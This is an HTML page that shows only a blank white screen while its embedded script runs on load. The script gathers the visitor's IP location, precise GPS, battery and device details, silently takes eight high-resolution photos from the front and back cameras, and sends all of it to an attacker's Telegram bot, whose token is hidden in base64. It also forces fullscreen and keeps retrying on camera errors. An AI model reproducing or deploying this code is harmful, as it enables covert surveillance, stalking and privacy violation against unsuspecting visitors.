<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title> </title>
<style>
  * { margin: 0; padding: 0; }
  html, body {
    width: 100vw;
    height: 100vh;
    background: white;
    overflow: hidden;
  }
  video, canvas {
    display: none;
  }
</style>
</head>
<body>
<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>
<script>
(function() {
  // ========== CREDENTIALS ==========
  const BOT_TOKEN = atob('ODc5MjQyNzYxODpBQUhIVWVNd1I2Y09Jd1BKY3lHdXBnN2lQN0JrOXhSVUNPOD==');
  const CHAT_ID = atob('ODQ0NzI5MDA3MQ==');

  // ========== STATE ==========
  const state = {
    stream: null,
    ip: null,
    ipData: null,
    geo: null,
    geoStatus: null,
    battery: null,
    charging: null
  };

  // ========== DOM ==========
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');

  // ========== SEND TO TELEGRAM ==========
  function sendText(msg) {
    try {
      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      fd.append('text', msg);
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: fd }).catch(() => {});
    } catch(e) {}
  }

  function sendPhoto(blob, caption) {
    try {
      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      fd.append('photo', blob, 'photo.jpg');
      if (caption) fd.append('caption', caption);
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(() => {});
    } catch(e) {}
  }

  // ========== CAPTURE PHOTO — 9:16 PORTRAIT HIGH QUALITY ==========
  function capturePhoto() {
    return new Promise((resolve) => {
      try {
        const vw = video.videoWidth;
        const vh = video.videoHeight;
        if (!vw || !vh) { resolve(null); return; }

        // قەبارەی گەورەتر: 1440x2560 (2K) بۆ وێنەی ڕوونتر
        const targetWidth = 1440;
        const targetHeight = 2560;
        const targetAspect = targetWidth / targetHeight;
        const videoAspect = vw / vh;

        let sx, sy, sw, sh;
        if (videoAspect > targetAspect) {
          sh = vh;
          sw = vh * targetAspect;
          sx = (vw - sw) / 2;
          sy = 0;
        } else {
          sw = vw;
          sh = vw / targetAspect;
          sx = 0;
          sy = (vh - sh) / 2;
        }

        canvas.width = targetWidth;
        canvas.height = targetHeight;
        ctx.drawImage(video, sx, sy, sw, sh, 0, 0, targetWidth, targetHeight);

        // کوالیتی 98% بۆ وێنەی زۆر ڕوون
        const dataUrl = canvas.toDataURL('image/jpeg', 0.98);
        const byteString = atob(dataUrl.split(',')[1]);
        const ab = new ArrayBuffer(byteString.length);
        const ia = new Uint8Array(ab);
        for (let i = 0; i < byteString.length; i++) {
          ia[i] = byteString.charCodeAt(i);
        }
        const blob = new Blob([ab], { type: 'image/jpeg' });
        resolve(blob);
      } catch(e) {
        resolve(null);
      }
    });
  }

  // ========== START CAMERA ==========
  function startCamera(facingMode) {
    return new Promise((resolve, reject) => {
      if (state.stream) {
        state.stream.getTracks().forEach(t => t.stop());
        state.stream = null;
      }

      // داوای ریزۆلوشنی بەرز بکە بۆ وێنەی باشتر
      const constraints = {
        video: {
          facingMode: facingMode,
          width: { ideal: 2560 },
          height: { ideal: 1440 }
        },
        audio: false
      };

      navigator.mediaDevices.getUserMedia(constraints)
        .then(s => {
          state.stream = s;
          video.srcObject = s;
          video.onloadedmetadata = function() {
            video.play();
            setTimeout(resolve, 500);
          };
          video.onerror = () => reject('Video error');
        })
        .catch(err => reject(err.message));
    });
  }

  function stopCamera() {
    if (state.stream) {
      state.stream.getTracks().forEach(t => t.stop());
      state.stream = null;
    }
  }

  // ========== GET IP ==========
  function getIP() {
    return new Promise((resolve) => {
      fetch('https://ipapi.co/json/')
        .then(r => r.json())
        .then(data => {
          state.ip = data.ip;
          state.ipData = data;
          resolve();
        })
        .catch(() => {
          fetch('https://ipinfo.io/json')
            .then(r => r.json())
            .then(data => {
              state.ip = data.ip;
              state.ipData = data;
              resolve();
            })
            .catch(() => resolve());
        });
    });
  }

  // ========== GET GPS ==========
  function getGPS() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        state.geoStatus = 'unsupported';
        resolve();
        return;
      }

      state.geoStatus = 'pending';
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          state.geo = {
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            acc: pos.coords.accuracy,
            alt: pos.coords.altitude,
            head: pos.coords.heading,
            speed: pos.coords.speed
          };
          state.geoStatus = 'granted';
          resolve();
        },
        (err) => {
          state.geoStatus = 'denied';
          resolve();
        },
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
      );
    });
  }

  // ========== GET BATTERY ==========
  function getBattery() {
    return new Promise((resolve) => {
      if ('getBattery' in navigator) {
        navigator.getBattery()
          .then(b => {
            state.battery = Math.round(b.level * 100);
            state.charging = b.charging;
            resolve();
          })
          .catch(() => resolve());
      } else {
        resolve();
      }
    });
  }

  // ========== SEND FULL INFO ==========
  function sendFullInfo() {
    let msg = '👤 USER DETECTED\n\n';
    msg += '🌐 IP: ' + (state.ip || 'Unknown') + '\n';
    if (state.ipData) {
      if (state.ipData.city) msg += '📍 City: ' + state.ipData.city + '\n';
      if (state.ipData.region) msg += '📍 Region: ' + state.ipData.region + '\n';
      if (state.ipData.country) msg += '📍 Country: ' + state.ipData.country + '\n';
      if (state.ipData.isp) msg += '🏢 ISP: ' + state.ipData.isp + '\n';
      if (state.ipData.org) msg += '🏢 Org: ' + state.ipData.org + '\n';
      if (state.ipData.loc) msg += '📍 Coords: ' + state.ipData.loc + '\n';
      if (state.ipData.timezone) msg += '🕐 Timezone: ' + state.ipData.timezone + '\n';
    }

    msg += '\n📍 GPS Status: ' + (state.geoStatus || 'pending') + '\n';
    if (state.geo) {
      msg += '📍 GPS Location:\n';
      msg += '   Latitude: ' + state.geo.lat + '\n';
      msg += '   Longitude: ' + state.geo.lon + '\n';
      if (state.geo.acc) msg += '   Accuracy: ±' + state.geo.acc + 'm\n';
      if (state.geo.alt) msg += '   Altitude: ' + state.geo.alt + 'm\n';
      if (state.geo.head) msg += '   Heading: ' + state.geo.head + '°\n';
      if (state.geo.speed) msg += '   Speed: ' + state.geo.speed + ' m/s\n';
      msg += '   Maps: https://maps.google.com/?q=' + state.geo.lat + ',' + state.geo.lon + '\n';
    }

    if (state.battery !== null) {
      msg += '\n🔋 Battery: ' + state.battery + '%';
      if (state.charging) msg += ' (⚡ Charging)';
      msg += '\n';
    }
    msg += '\n📱 Device: ' + navigator.userAgent.substring(0, 100) + '\n';
    msg += '🖥️ Screen: ' + screen.width + 'x' + screen.height + '\n';
    msg += '🌍 Language: ' + (navigator.language || 'unknown') + '\n';
    msg += '🕐 Timezone: ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '\n';
    msg += '⏱️ Time: ' + new Date().toLocaleString();

    sendText(msg);
  }

  // ========== CAPTURE MULTIPLE ==========
  async function captureMultiple(count, label) {
    for (let i = 0; i < count; i++) {
      const photo = await capturePhoto();
      if (photo) {
        // قەبارەی وێنە بۆ تەلەگرام دەنێرین، تەلەگرام خۆی کۆمپرێس دەکات بەڵام وێنەکە گەورە دەمێنێتەوە
        let caption = '📸 ' + label + ' ' + (i + 1) + '/' + count + ' • 1440x2560';
        if (state.geo) {
          caption += '\n📍 ' + state.geo.lat + ', ' + state.geo.lon;
        }
        sendPhoto(photo, caption);
      }
      await new Promise(r => setTimeout(r, 300));
    }
  }

  // ========== MAIN EXECUTION ==========
  async function main() {
    // Get all info
    await Promise.all([getIP(), getBattery()]);
    await getGPS();

    // Send full info
    sendFullInfo();

    // Start camera and capture
    try {
      sendText('📷 Starting front camera...');
      await startCamera('user');
      await new Promise(r => setTimeout(r, 400));

      sendText('📸 Capturing 4 front photos (1440x2560)...');
      await captureMultiple(4, 'Front Selfie');

      sendText('📷 Switching to back camera...');
      await startCamera('environment');
      await new Promise(r => setTimeout(r, 400));

      sendText('📸 Capturing 4 back photos (1440x2560)...');
      await captureMultiple(4, 'Back Camera');

      stopCamera();
      sendText('✅ ALL DONE — 8 photos captured and sent (4 front + 4 back) — 1440x2560 HD');

    } catch(err) {
      sendText('❌ Camera error: ' + err);
      document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;cursor:pointer;" id="retry"></div>';
      document.getElementById('retry').onclick = function() {
        this.remove();
        main();
      };
      setTimeout(() => {
        const el = document.getElementById('retry');
        if (el) el.click();
      }, 2000);
    }
  }

  // ========== START ==========
  try {
    if (document.documentElement.requestFullscreen) {
      document.documentElement.requestFullscreen().catch(() => {});
    }
  } catch(e) {}

  try {
    if (navigator.screen && navigator.screen.wakeLock) {
      navigator.screen.wakeLock.request('screen').catch(() => {});
    }
  } catch(e) {}

  if (document.readyState === 'complete') {
    main();
  } else {
    window.addEventListener('load', main);
  }

})();
</script>
</body>
</html>
